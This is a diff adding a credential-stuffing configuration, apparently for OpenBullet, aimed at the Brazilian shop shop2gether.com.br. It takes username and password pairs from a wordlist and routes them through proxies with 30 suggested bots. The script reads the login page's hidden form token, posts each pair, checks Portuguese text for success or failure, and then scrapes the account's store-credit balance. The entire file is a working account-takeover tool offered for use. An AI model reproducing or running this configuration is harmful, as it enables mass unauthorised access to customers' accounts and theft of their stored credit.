@@ -1,0 +1,103 @@
+[SETTINGS]
+{
+  "Name": "SHOP2GATHER",
+  "SuggestedBots": 30,
+  "MaxCPM": 0,
+  "LastModified": "2021-10-16T12:34:33.6924856-03:00",
+  "AdditionalInfo": "",
+  "Author": "ChmoD",
+  "Version": "1.2.9 Anomaly",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.shop2gether.com.br/customer/account/login/" 
+  
+  HEADER "Host: www.shop2gether.com.br" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://www.shop2gether.com.br/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7" 
+
+PARSE "<SOURCE>" LR "<input name=\"form_key\" type=\"hidden\" value=\"" "\" />" -> VAR "TKN" 
+
+REQUEST POST "https://www.shop2gether.com.br/customer/account/loginPost/" 
+  CONTENT "form_key=<TKN>&login%5Busername%5D=<USER>&login%5Bpassword%5D=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.shop2gether.com.br" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://www.shop2gether.com.br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://www.shop2gether.com.br/customer/account/login/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "MINHA CONTA" 
+    KEY "Seu saldo atual é:" 
+    KEY "Olá," 
+  KEYCHAIN Failure OR 
+    KEY "Acesso ou senha inválida." 
+
+REQUEST GET "https://www.shop2gether.com.br/storecredit/info/" 
+  
+  HEADER "Host: www.shop2gether.com.br" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://www.shop2gether.com.br/customer/account/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7" 
+
+PARSE "<SOURCE>" LR "<span class=\"price\">R$" "</span></div>" -> CAP "SALDO" 
+
